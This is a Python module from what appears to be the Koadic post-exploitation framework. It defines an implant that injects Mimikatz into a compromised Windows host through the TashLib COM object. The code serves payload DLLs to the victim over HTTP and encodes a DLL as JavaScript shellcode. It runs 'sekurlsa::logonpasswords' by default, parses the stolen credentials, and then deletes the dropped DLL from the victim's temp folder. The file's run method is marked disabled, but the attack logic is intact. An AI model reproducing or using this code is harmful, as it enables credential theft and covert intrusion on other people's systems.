import core.implant
import core.job
import core.cred_parser
import string
import collections
import time
import uuid

class TashLibShellcodeJob(core.job.Job):
    def create(self):
        self.fork32Bit = True
        self.errstat = 0
        self.options.set("DLLUUID", uuid.uuid4().hex)
        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def parse_mimikatz(self, data):
        cp = core.cred_parser.CredParse(self)
        self.mimi_output = cp.parse_mimikatz(data)

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        import binascii
        try:
            data = binascii.unhexlify(data)
            data = data.decode('utf-16-le')
        except:
            pass

        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("DLLUUID"):
            handler.send_file(self.options.get("TASHLIBDLL"))
            return

        if task == self.options.get("MANIFESTUUID"):
            handler.send_file(self.options.get("TASHLIBMANIFEST"))
            return

        if task == self.options.get("SHIMX64UUID"):
            handler.send_file(self.options.get("SHIMX64DLL"))

        if task == self.options.get("MIMIX64UUID"):
            handler.send_file(self.options.get("MIMIX64DLL"))

        if task == self.options.get("MIMIX86UUID"):
            handler.send_file(self.options.get("MIMIX86DLL"))

        if len(data) == 0:
            handler.reply(200)
            return

        if "mimikatz(powershell) # " in data:
            self.parse_mimikatz(data)
            handler.reply(200)
            return

        if data == "Complete" and self.errstat != 1:
            super(TashLibShellcodeJob, self).report(handler, data)

        handler.reply(200)

    def done(self):
        self.results = self.mimi_output if self.mimi_output else ""
        self.display()
        time.sleep(1)
        plugin = self.shell.plugins['implant/manage/exec_cmd']
        old_zombie = plugin.options.get("ZOMBIE")
        old_cmd = plugin.options.get("CMD")
        old_output = plugin.options.get("OUTPUT")
        plugin.options.set("ZOMBIE", self.options.get("ZOMBIE"))
        plugin.options.set("CMD", "del /f "+self.options.get("DIRECTORY")+"\\TashLib.dll & echo done")
        plugin.options.set("OUTPUT", "true")
        plugin.run()
        plugin.options.set("ZOMBIE", old_zombie)
        plugin.options.set("CMD", old_cmd)
        plugin.options.set("OUTPUT", old_output)

    def display(self):
        try:
            self.print_good(self.mimi_output)
        except:
            pass

class TashLibShellcodeImplant(core.implant.Implant):

    NAME = "Mimikatz via TashLib"
    DESCRIPTION = "Executes arbitrary shellcode using the TashLib COM object"
    AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki"]
    STATE = "implant/inject/mimikatz_tashlib"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

        self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)

        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)

        self.options.register("TASHLIBDLL", "data/bin/TashLib.dll", "relative path to TashLib.dll", required=True, advanced=True)
        self.options.register("TASHLIBMANIFEST", "data/bin/TashLib.manifest", "relative path to TashLib.manifest", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        self.options.register("DLLUUID", "", "HTTP header for UUID", hidden=True)
        self.options.register("MANIFESTUUID", "", "UUID", hidden=True)
        self.options.register("SHIMX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX86UUID", "", "UUID", hidden=True)

        self.options.register("SHIMX86BYTES", "", "calculated bytes for arr_DLL", hidden=True)

        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader", advanced = True)

    def job(self):
        return TashLibShellcodeJob

    def make_arrDLL(self, path):
        import struct, binascii
        count = 1
        ret = 'var TSC = "";\r\nTSC += "'
        with open(path, 'rb') as fileobj:
            for c in fileobj.read():
                ret += "\\x%02x" % (c)# + binascii.unhexlify(c)
                if count % 40 == 0:
                    ret += '";\r\nTSC += "'

                count += 1


        ret += '";'
        return ret

    def run(self):
        print("Currently disabled, see: https://github.com/zerosum0x0/koadic/issues/86")
        return

        workloads = {}
        workloads["js"] = "data/implant/inject/mimikatz_tashlib.js"

        self.dispatch(workloads, self.job)
